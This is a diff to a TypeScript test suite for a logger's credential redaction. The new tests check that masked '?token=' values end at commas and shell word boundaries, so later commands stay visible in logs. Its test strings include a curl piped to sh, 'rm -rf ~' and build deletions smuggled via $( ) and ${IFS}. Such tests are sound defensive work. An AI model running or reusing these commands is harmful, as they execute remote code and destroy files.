@@ -1,7 +1,7 @@
 import { randomBytes } from 'node:crypto'
 import { setTimeout as delay } from 'node:timers/promises'
 import { describe, expect, it } from 'vitest'
-import { createLogger, createOperationScope, isCredentialKey, isCredentialParameter, redactText, redactUrlParameters, runInScope, type LogEvent, type LoggerConfig, type LogSink } from '../../src/index.js'
+import { createLogger, createOperationScope, isCredentialKey, isCredentialParameter, redactCredentials, redactText, redactUrlParameters, runInScope, type LogEvent, type LoggerConfig, type LogSink } from '../../src/index.js'
 
 function memorySink(): LogSink & { events: LogEvent[] } {
   const events: LogEvent[] = []
@@ -220,6 +220,42 @@ describe('secret keys and opaque values (logger-fixes-1, logger-fixes-2)', () =>
     const event = await logOnce({ note: text }, { message: text })
     expect(event.message).toBe(text)
     expect(event.fields).toEqual({ note: text })
+  })
+
+  // Slice 7c review R7C-TL-2 (owner default N2 (a)): a credential query value ran across the commas, so a CSV row whose
+  // URL carries a token hid its amount and account; a comma ends the value in a log line, as it ends the authority.
+  it('ends a credential query value at a comma in a log line and a logged field, so the CSV row\'s fields show', async () => {
+    const row = 'payee,amount,account\nhttps://pay.example.com/?token=t5ecret,1000000,x@y.com\n'
+    const shown = 'payee,amount,account\nhttps://pay.example.com/?token=[redacted],1000000,x@y.com\n'
+    expect(redactText(row)).toBe(shown)
+    const event = await logOnce({ note: row }, { message: row })
+    expect(event.message).toBe(shown)
+    expect(event.fields).toEqual({ note: shown })
+    const plain = 'payee,amount,account\nhttps://pay.example.com/?page=1,1000000,x@y.com\n'
+    expect(redactText(plain)).toBe(plain)
+  })
+
+  // Slice 7c review R7C-TL-1 (default D31): a word's credential value ran to `&` or `#` whatever the word held, so the
+  // statements after `?token=x` in an eval string, a `$(` body or an ssh command were hidden. Only a URL that is its
+  // whole unit keeps that rule; any other word's value ends as a shell word ends it.
+  it.each<[string, 'word' | 'shell', string]>([
+    ['an eval string', 'shell', 'eval "curl https://h.invalid/?token=x;rm${IFS}-rf${IFS}~/nothing-here"'],
+    ['a pipe in an eval string', 'shell', 'eval "curl -s https://h/?token=x|sh"'],
+    ['a $( body in double quotes', 'shell', 'echo "$(curl https://h/?token=x;rm -rf build)"'],
+    ['an ssh remote command word', 'word', 'curl https://h/?token=x;rm -rf build'],
+    ['a word with ${IFS} before the URL', 'word', '"$(curl${IFS}https://h/?token=x;rm${IFS}-rf${IFS}build)"'],
+    ['a $( in a double-quoted URL', 'word', 'curl "https://h/?token=x$(rm -rf ~)"'],
+  ])('shows what follows a credential value in %s', (_, context, text) => {
+    expect(redactCredentials(text, context)).toBe(text.replace('?token=x', '?token=[redacted]'))
+  })
+
+  it.each<[string, 'word' | 'shell', string, string]>([
+    ['a URL field', 'word', 'https://h.example/x?token=ab(c5ecret)d', 'https://h.example/x?token=[redacted]'],
+    ['a URL after an option name', 'word', '--url=https://h.example/x?token=ab|c5ecret&page=2', '--url=https://h.example/x?token=[redacted]&page=2'],
+    ['a single-quoted URL in a shell body', 'shell', "curl 'https://h/?token=a b'", "curl 'https://h/?token=[redacted]'"],
+    ['a double-quoted URL in a shell body', 'shell', 'curl "https://h/?token=ab(c5ecret)d"', 'curl "https://h/?token=[redacted]"'],
+  ])('still hides the whole credential value of %s', (_, context, text, shown) => {
+    expect(redactCredentials(text, context)).toBe(shown)
   })
 
   it.each([
